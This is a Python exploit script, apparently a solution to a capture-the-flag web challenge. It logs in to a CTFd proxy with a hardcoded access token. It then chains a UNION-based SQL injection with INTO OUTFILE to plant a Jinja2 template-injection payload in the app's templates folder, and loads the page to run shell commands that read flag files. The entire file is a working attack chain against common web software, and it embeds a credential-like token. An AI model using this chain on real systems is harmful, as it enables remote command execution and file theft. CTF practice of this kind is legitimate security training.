#!/usr/bin/env python3
import argparse
import sys
import urllib.parse

import requests


TOKEN = "ctfd_fbee761c64f386754e6a81f5b33dea580f61385c934ba9987349716ce6441f7e"


def build_template_payload() -> str:
    template = (
        "{{ cycler.__init__.__globals__.os.popen("
        "\"cat /flag 2>/dev/null || "
        "cat /flag.txt 2>/dev/null || "
        "cat /app/flag 2>/dev/null || "
        "cat /app/flag.txt 2>/dev/null\""
        ").read() }}"
    )
    hex_template = template.encode().hex()
    cols = [f"0x{hex_template}"] + ["NULL"] * 11
    return (
        "0 union all select "
        + ",".join(cols)
        + " into outfile '/app/templates/live_promo.html'-- -"
    )


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("base_url", help="Example: http://34.2.22.80:30099")
    parser.add_argument("--token", default=TOKEN)
    args = parser.parse_args()

    base = args.base_url.rstrip("/")
    session = requests.Session()

    auth = session.post(
        f"{base}/__ctfd_auth",
        data={"access_token": args.token},
        timeout=10,
    )
    if auth.status_code not in (200, 302, 303):
        print(f"proxy auth failed: {auth.status_code}", file=sys.stderr)
        return 1

    payload = build_template_payload()
    injected = f"{base}/match?id={urllib.parse.quote(payload, safe='')}"
    write_resp = session.get(injected, timeout=10)
    if write_resp.status_code != 200:
        print(f"outfile write failed: {write_resp.status_code}", file=sys.stderr)
        return 1

    final = session.get(f"{base}/promo/final-week", timeout=10)
    print(final.text.strip())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
